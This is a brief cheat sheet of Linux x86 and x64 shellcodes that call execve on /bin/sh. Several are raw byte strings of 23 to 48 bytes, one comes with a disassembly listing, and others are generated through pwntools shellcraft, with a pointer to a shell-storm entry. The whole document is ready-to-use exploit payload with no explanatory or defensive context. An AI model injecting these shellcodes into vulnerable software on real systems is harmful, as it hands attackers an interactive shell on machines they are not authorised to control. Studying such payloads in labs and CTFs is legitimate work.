# &#35; linux x86 exec shellcodes

```bash

# 44 bytes
shellcode = asm(shellcraft.linux.sh())

# 23 bytes
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"

# 26 bytes
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"


```


# &#35; linux x64 exec shellcodes

```bash

# 48 bytes
>>> context.clear()
>>> context.os='linux'
>>> context.arch='amd64'
>>> asm(shellcraft.amd64.linux.sh())
b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
>>>


# 26 bytes
0:  31 c0                   xor    eax,eax
2:  50                      push   rax
3:  48 31 d2                xor    rdx,rdx
6:  48 31 f6                xor    rsi,rsi
9:  48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
10: 2f 73 68
13: 53                      push   rbx
14: 54                      push   rsp
15: 5f                      pop    rdi
16: b0 3b                   mov    al,0x3b
18: 0f 05                   syscall

shellcode = b"\x31\xc0\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"


# 23 bytes
http://shell-storm.org/shellcode/files/shellcode-585.php
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"




```
